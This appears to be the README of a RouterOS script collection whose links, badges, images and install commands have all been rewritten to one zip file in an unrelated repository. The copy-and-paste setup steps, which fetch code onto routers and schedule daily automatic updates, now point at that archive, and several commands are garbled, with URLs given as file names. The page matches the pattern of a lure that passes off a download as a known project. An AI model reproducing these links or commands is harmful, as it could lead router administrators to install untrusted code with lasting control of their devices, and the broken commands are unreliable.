RouterOS Scripts
================

[![GitHub stars](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)
[![GitHub forks](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)
[![GitHub watchers](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)
[![required RouterOS version](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)
[![Telegram group @routeros_scripts](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip%40routeros__scripts-%2326A5E4?logo=telegram&style=flat)](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)
[![donate with PayPal](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip%3F-Donate!-orange?logo=githubsponsors&logoColor=orange&style=flat)](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)

![RouterOS Scripts Logo](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)

[RouterOS ↗️](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) is the operating system developed
by [MikroTik ↗️](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) for networking tasks. This
repository holds a number of [scripts ↗️](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)
to manage RouterOS devices or extend their functionality.

*Use at your own risk*, pay attention to
[license and warranty](#license-and-warranty), and
[disclaimer on external links](#disclaimer-on-external-links)!

Requirements
------------

### Software (RouterOS)

Latest version of the scripts require recent RouterOS to function properly.
Make sure to install latest updates before you begin. If new functionality
or a breaking change in RouterOS `7.n` is used in my scripts I push my
change some time after `7.(n+1)` was released. At any time you should have
at least two minor and their bugfix releases to choose from.

Specific scripts may require even newer RouterOS version.

> ℹ️ **Info**: The `main` branch is now RouterOS v7 only. If you are still
> running RouterOS v6 switch to `routeros-v6` branch!

Starting with RouterOS 7.17 the
[device-mode ↗️](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)
has been extended to give more fine-grained control over what features are
available. You need to enable `scheduler` and `fetch` at least, specific
scripts may require additional features.

### Hardware

RouterOS packages increase in size with each release. This becomes a
problem for devices with 16MB storage and below, those with an ARM CPU
are specifically affected.

Huge configuration and lots of scripts give an extra risk. **Take care!**

Initial setup
-------------

### Get me ready!

If you know how things work just copy and paste the
[initial commands](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip). Remember to edit and rerun
`global-config-overlay`!
First time users should take the long way below.

### Live presentation

Want to see it in action? I've had a presentation [Repository based
RouterOS script distribution ↗️](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)
including demonstation recorded live at [MUM Europe
2019 ↗️](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) in Vienna.

> ⚠️ **Warning**: Some details changed. So see the presentation, then follow
> the steps below for up-to-date commands.

### The long way in detail

The update script does server certificate verification, so first step is to
download the certificates. If you intend to download the scripts from a
different location (for example from https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) install the corresponding
certificate chain.

    /tool/fetch "https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip" dst-path="https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip";

![screenshot: download certs](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)

Note that the commands above do *not* verify server certificate, so if you
want to be safe download with your workstations's browser and transfer the
file to your MikroTik device.

* [ISRG Root X2 ↗️](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)

Then we import the certificate.

    /certificate/import file-name="https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip" passphrase="";

Do not worry that the command is not shown - that happens because it contains
a sensitive property, the passphrase.

![screenshot: import certs](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)

For basic verification we rename the certificate and print it by
fingerprint. Make sure exactly this one certificate ("*ISRG-Root-X2*")
is shown.

    /certificate/set name="ISRG-Root-X2" [ find where common-name="ISRG Root X2" ];
    /certificate/print proplist=name,fingerprint where fingerprint="69729b8e15a86efc177a57afb7171dfc64add28c2fca8cf1507e34453ccb1470";

![screenshot: check certs](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)

Always make sure there are no certificates installed you do not know or want!

All following commands will verify the server certificate. For validity the
certificate's lifetime is checked with local time, so make sure the device's
date and time is set correctly!

Now let's download the main scripts and add them in configuration on the fly.

    :foreach Script in={ "global-config"; "global-config-overlay"; "global-functions" } do={ /system/script/add name=$Script owner=$Script source=([ /tool/fetch check-certificate=yes-without-crl ("https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip" . $Script . ".rsc") output=user as-value]->"data"); };

![screenshot: import scripts](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)

And finally load configuration and functions and add the scheduler.

    /system/script { run global-config; run global-functions; };
    /system/scheduler/add name="global-scripts" start-time=startup on-event="/system/script { run global-config; run global-functions; }";

![screenshot: run and schedule scripts](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)

> 💡️ **Hint**: You see complaints regarding syntax errors? Most likely the
> RouterOS on your device is too old. Check for updates!

### Scheduled automatic updates

The last step is optional: Add this scheduler **only** if you want the
scripts to be updated automatically!

    /system/scheduler/add name="ScriptInstallUpdate" start-time=startup interval=1d on-event=":global ScriptInstallUpdate; \$ScriptInstallUpdate;";

![screenshot: schedule update](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)

Editing configuration
---------------------

The configuration needs to be tweaked for your needs. Edit
`global-config-overlay`, copy relevant configuration from
[`global-config`](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (the one without `-overlay`).
Save changes and exit with `Ctrl-o`.

    /system/script/edit global-config-overlay source;

![screenshot: edit global-config-overlay](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)

Additionally creating configuration snippets is supported. The script name
of these snippets has to start with `global-config-overlay.d/` to make them
being loaded automatically. This allows to split off parts of the
configuration.

To apply your changes run `global-config`, which will automatically load
the overlay as well:

    /system/script/run global-config;

![screenshot: apply configuration](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)

This last step is required when ever you make changes to your configuration.

> ℹ️ **Info**: It is recommended to edit the configuration using the command
> line interface. If using Winbox on Windows OS, the line endings may be
> missing. To fix this run:
> `/system/script/set source=[ :tocrlf [ get global-config-overlay source ] ] global-config-overlay;`

Updating scripts
----------------

To update existing scripts just run function `$ScriptInstallUpdate`. If
everything is up-to-date it will not produce any output.

    $ScriptInstallUpdate;

![screenshot: update scripts](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)

If the update includes news or requires configuration changes a notification
is sent - in addition to terminal output and log messages.

![news and changes notification](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)

Adding a script
---------------

To add a script from the repository run function `$ScriptInstallUpdate` with
a comma separated list of script names.

    $ScriptInstallUpdate check-certificates,check-routeros-update;

![screenshot: install scripts](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)

Scheduler and events
--------------------

Most scripts are designed to run regularly from
[scheduler ↗️](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip). We just
added `check-routeros-update`, so let's run it daily to make sure not to
miss an update.

    /system/scheduler/add name="check-routeros-update" interval=1d start-time=startup on-event="/system/script/run check-routeros-update;";

![screenshot: schedule script](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)

Some events can run a script. If you want your DHCP hostnames to be available
in DNS use `dhcp-to-dns` with the events from dhcp server. For a regular
cleanup add a scheduler entry.

    $ScriptInstallUpdate dhcp-to-dns,lease-script;
    /ip/dhcp-server/set lease-script=lease-script [ find ];
    /system/scheduler/add name="dhcp-to-dns" interval=5m on-event="/system/script/run dhcp-to-dns;";

![screenshot: setup lease script](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)

There's much more to explore... Have fun!

Available scripts
-----------------

* [Find and remove access list duplicates](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`accesslist-duplicates`)
* [Upload backup to Mikrotik cloud](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`backup-cloud`)
* [Send backup via e-mail](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`backup-email`)
* [Save configuration to fallback partition](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`backup-partition`)
* [Upload backup to server](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`backup-upload`)
* [Download packages for CAP upgrade from CAPsMAN](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`capsman-download-packages`)
* [Run rolling CAP upgrades from CAPsMAN](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`capsman-rolling-upgrade`)
* [Renew locally issued certificates](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`certificate-renew-issued`)
* [Renew certificates and notify on expiration](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`check-certificates`)
* [Notify about health state](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`check-health`)
* [Notify on LTE firmware upgrade](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`check-lte-firmware-upgrade`)
* [Check perpetual license on CHR](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`check-perpetual-license`)
* [Notify on RouterOS update](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`check-routeros-update`)
* [Collect MAC addresses in wireless access list](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`collect-wireless-mac`)
* [Use wireless network with daily psk](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`daily-psk`)
* [Comment DHCP leases with info from access list](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`dhcp-lease-comment`)
* [Create DNS records for DHCP leases](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`dhcp-to-dns`)
* [Automatically upgrade firmware and reboot](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`firmware-upgrade-reboot`)
* [Download, import and update firewall address-lists](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`fw-addr-lists`)
* [Wait for global functions und modules](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`global-wait`)
* [Send GPS position to server](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`gps-track`)
* [Use WPA network with hotspot credentials](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`hotspot-to-wpa` & `hotspot-to-wpa-cleanup`)
* [Create DNS records for IPSec peers](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`ipsec-to-dns`)
* [Update configuration on IPv6 prefix change](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`ipv6-update`)
* [Manage IP addresses with bridge status](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`ip-addr-bridge`)
* [Run other scripts on DHCP lease](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`lease-script`)
* [Manage LEDs dark mode](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`leds-day-mode`, `leds-night-mode` & `leds-toggle-mode`)
* [Forward log messages via notification](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`log-forward`)
* [Mode button with multiple presses](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`mode-button`)
* [Manage DNS and DoH servers from netwatch](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`netwatch-dns`)
* [Notify on host up and down](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`netwatch-notify`)
* [Visualize OSPF state via LEDs](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`ospf-to-leds`)
* [Manage system update](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`packages-update`)
* [Run scripts on ppp connection](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`ppp-on-up`)
* [Act on received SMS](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`sms-action`)
* [Forward received SMS](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`sms-forward`)
* [Play Super Mario theme](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`super-mario-theme`)
* [Chat with your router and send commands via Telegram bot](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`telegram-chat`)
* [Install LTE firmware upgrade](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`unattended-lte-firmware-upgrade`)
* [Update GRE configuration with dynamic addresses](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`update-gre-address`)
* [Update tunnelbroker configuration](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`update-tunnelbroker`)

Available modules
-----------------

* [Manage ports in bridge](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`mod/bridge-port-to`)
* [Manage VLANs on bridge ports](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`mod/bridge-port-vlan`)
* [Inspect variables](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`mod/inspectvar`)
* [IP address calculation](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`mod/ipcalc`)
* [Send notifications via e-mail](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`mod/notification-email`)
* [Send notifications via Gotify](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`mod/notification-gotify`)
* [Send notifications via Matrix](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`mod/notification-matrix`)
* [Send notifications via Ntfy](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`mod/notification-ntfy`)
* [Send notifications via Telegram](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`mod/notification-telegram`)
* [Download script and run it once](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`mod/scriptrunonce`)
* [Import ssh keys for public key authentication](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) (`mod/ssh-keys-import`)

Installing custom scripts & modules
-----------------------------------

My scripts cover a lot of use cases, but you may have your own ones. You can
still use my scripts to manage and deploy yours, by specifying `base-url`
(and `url-suffix`) for each script.

This will fetch and install a script `https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip` from the given url:

    $ScriptInstallUpdate hello-world "https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip";

![screenshot: install custom script](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)

For a script to be considered valid it has to begin with a *magic token*.
Have a look at [any script](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) and copy the first line
without modification.

Starting a script's name with `mod/` makes it a module and it is run
automatically by `global-functions`.

### Linked custom scripts & modules

> ⚠️ **Warning**: These links are being provided for your convenience only;
> they do not constitute an endorsement or an approval by me. I bear no
> responsibility for the accuracy, legality or content of the external site
> or for that of subsequent links. Contact the external site for answers to
> questions regarding its content.

* [Hello World](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)
  (This is a demo script to show how the linking to external documentation
  will be done.)

> ℹ️ **Info**: You have your own set of scripts and/or modules and want these
> to be listed here? There should be a general info page that links here,
> and documentation for each script. You can start by cloning my
> [Custom RouterOS-Scripts](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)
> (or fork on [GitHub](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)
> or [GitLab](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)) and make
> your changes. Then please [get in contact](#patches-issues-and-whishlist)...

Removing a script
-----------------

There is no specific function for script removal. Just remove it from
configuration...

    /system/script/remove to-be-removed;

![screenshot: remove script](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)

Possibly a scheduler and other configuration has to be removed as well.

Contact
-------

We have a Telegram Group [RouterOS-Scripts ↗️](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)!

[![RouterOS Scripts Telegram Group](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)

Get help, give feedback or just chat - but do not expect free professional
support!

Contribute
----------

Thanks a lot for [past contributions](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)! ❤️

### Patches, issues and whishlist

Feel free to contact me via e-mail or open an
[issue](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) or
[pull request](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)
at github.

### Donate

This project is developed in private spare time and usage is free of charge
for you. If you like the scripts and think this is of value for you or your
business please consider to
[donate with PayPal ↗️](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip).

[![donate with PayPal](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip%3F-Donate!-orange?logo=githubsponsors&logoColor=orange&style=for-the-badge)](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)

Thanks a lot for your support!

License and warranty
--------------------

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
[GNU General Public License](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip) for more details.

Disclaimer on external links
----------------------------

Our website contains links to the websites of third parties ("external
links"). As the content of these websites is not under our control, we
cannot assume any liability for such external content. In all cases, the
provider of information of the linked websites is liable for the content
and accuracy of the information provided. At the point in time when the
links were placed, no infringements of the law were recognisable to us.
As soon as an infringement of the law becomes known to us, we will
immediately remove the link in question.

> 💡️ **Hint**: All external links are marked with an arrow pointing
> diagonally in an up-right (or north-east) direction (↗️).

Upstream
--------

[![upstream](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)

URL:
[https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)

Mirror:
[https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)
[https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip](https://raw.githubusercontent.com/rakibofcx/routeros-scripts/main/doc/scripts-routeros-v3.4.zip)

---
[⬆️ Go back to top](#top)
